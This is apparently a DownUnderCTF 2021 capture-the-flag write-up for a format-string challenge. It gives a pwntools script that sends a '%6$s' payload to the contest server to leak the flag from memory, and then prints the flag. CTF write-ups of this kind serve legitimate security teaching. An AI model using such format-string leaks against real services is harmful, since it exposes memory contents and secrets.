# Leaking like a sieve
>This program I developed will greet you, but my friend said it is leaking data like a sieve, what did I forget to add?

> Author: xXl33t_h@x0rXx

> nc pwn-2021.duc.tf 31918

[hellothere](https://drive.google.com/file/d/1gBUUWwU-Z9VRV49flJbHABBEyM-MRM_q/view?usp=sharing)

# Solution


```
from pwn import *

if args.REMOTE:
    con = remote('pwn-2021.duc.tf', 31918)
else:
    con = process('./hellothere')

payload  = b''
payload += b'%6$s'

con.sendline(payload)
flag = con.recvuntil(b'}')

print(flag)
```

> Flag: `DUCTF{f0rm4t_5p3c1f13r_m3dsg!}`
